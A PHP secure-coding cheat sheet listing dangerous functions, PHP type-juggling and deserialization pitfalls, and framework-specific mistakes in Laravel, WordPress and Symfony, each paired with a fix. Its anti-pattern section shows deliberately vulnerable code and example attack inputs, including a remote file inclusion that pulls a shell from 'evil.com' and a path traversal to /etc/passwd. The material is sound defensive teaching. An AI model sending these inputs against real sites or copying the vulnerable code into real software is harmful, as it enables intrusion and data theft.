# PHP Security Patterns

## Dangerous Functions

| Function | Risk | CWE | Severity | Safe Alternative |
|----------|------|-----|----------|-----------------|
| `eval($userInput)` | Code injection | CWE-94 | CRITICAL | Avoid entirely |
| `system($cmd)` | Command injection | CWE-78 | CRITICAL | `escapeshellarg()` + specific command |
| `exec($cmd)` | Command injection | CWE-78 | CRITICAL | `escapeshellarg()` |
| `passthru($cmd)` | Command injection | CWE-78 | CRITICAL | Avoid |
| `shell_exec($cmd)` | Command injection | CWE-78 | CRITICAL | Avoid |
| `preg_replace('/e', $input)` | Code execution | CWE-94 | CRITICAL | `preg_replace_callback()` |
| `unserialize($userInput)` | Deserialization RCE | CWE-502 | CRITICAL | `json_decode()` |
| `include($userInput)` | Local/remote file inclusion | CWE-98 | CRITICAL | Allowlist of files |
| `require($userInput)` | File inclusion | CWE-98 | CRITICAL | Static includes only |
| `extract($_GET)` | Variable injection | CWE-621 | HIGH | Access `$_GET['key']` directly |
| `$$varname` | Variable variable injection | CWE-621 | HIGH | Use arrays |
| `assert($userInput)` | Code execution (PHP < 8) | CWE-94 | CRITICAL | Remove or use PHP 8+ |
| `create_function(...)` | Code injection (deprecated) | CWE-94 | CRITICAL | Use closures |
| `file_get_contents($userUrl)` | SSRF | CWE-918 | HIGH | Validate URL, restrict protocols |
| `md5($password)` / `sha1($password)` | Weak password hashing | CWE-916 | HIGH | `password_hash($password, PASSWORD_BCRYPT)` |

## PHP-Specific Vulnerabilities

### Type Juggling (== vs ===)
```php
// DANGEROUS: Loose comparison
if ($_GET['password'] == $storedHash) { ... }
// "0e123456" == "0e654321" is TRUE! (both are 0 in scientific notation)
// "0" == false is TRUE!
// "php" == 0 is TRUE! (non-numeric string cast to 0)

// SAFE: Strict comparison
if ($_GET['password'] === $storedHash) { ... }
// Or use hash_equals() for timing-safe comparison
if (hash_equals($storedHash, hash('sha256', $password))) { ... }
```

### Magic Methods in Deserialization
```php
// These are called automatically during unserialize():
// __wakeup() - on unserialize
// __destruct() - on garbage collection
// __toString() - on string cast
// __call() - on undefined method

// Gadget chain: unserialize → __destruct → file_put_contents → webshell
// NEVER unserialize user input!
```

## Framework-Specific

### Laravel
| Pattern | Risk | Fix |
|---------|------|-----|
| `{!! $userInput !!}` in Blade | XSS (unescaped) | Use `{{ $userInput }}` (escaped) |
| Mass assignment without `$fillable` | Mass assignment | Define `$fillable` or `$guarded` |
| `DB::raw($userInput)` | SQL injection | Use query builder with bindings |
| Missing CSRF `@csrf` on forms | CSRF | Add `@csrf` directive |
| `Storage::get($userPath)` | Path traversal | Validate path, use `basename()` |
| `Route::any()` without auth | Unauthorized access | Add `auth` middleware |

### WordPress
| Pattern | Risk | Fix |
|---------|------|-----|
| `$wpdb->query("... $var")` | SQL injection | `$wpdb->prepare("... %s", $var)` |
| `echo $_GET['x']` in themes | XSS | `echo esc_html($_GET['x'])` |
| Missing nonce checks | CSRF | `wp_verify_nonce()` |
| `update_option()` without capability check | Privilege escalation | `current_user_can()` |
| `wp_remote_get($user_url)` | SSRF | Validate URL |
| `call_user_func($_GET['fn'])` | Arbitrary function call | Allowlist functions |

### Symfony
| Pattern | Risk | Fix |
|---------|------|-----|
| Twig `{{ var|raw }}` | XSS | Use `{{ var }}` (auto-escaped) |
| Raw Doctrine DQL with concatenation | SQL injection | Use parameters `:param` |
| Missing `#[IsGranted]` on controllers | Unauthorized access | Add access control |

## Common Anti-Patterns

```php
// DANGEROUS: SQL injection
$result = mysqli_query($conn, "SELECT * FROM users WHERE id = " . $_GET['id']);

// SAFE: Prepared statement
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();

// DANGEROUS: File inclusion
include($_GET['page'] . '.php');
// Attacker: ?page=../../etc/passwd%00 (null byte in old PHP)
// Or: ?page=http://evil.com/shell (if allow_url_include=On)

// SAFE: Allowlist
$allowed = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $allowed)) {
    include($_GET['page'] . '.php');
}
```
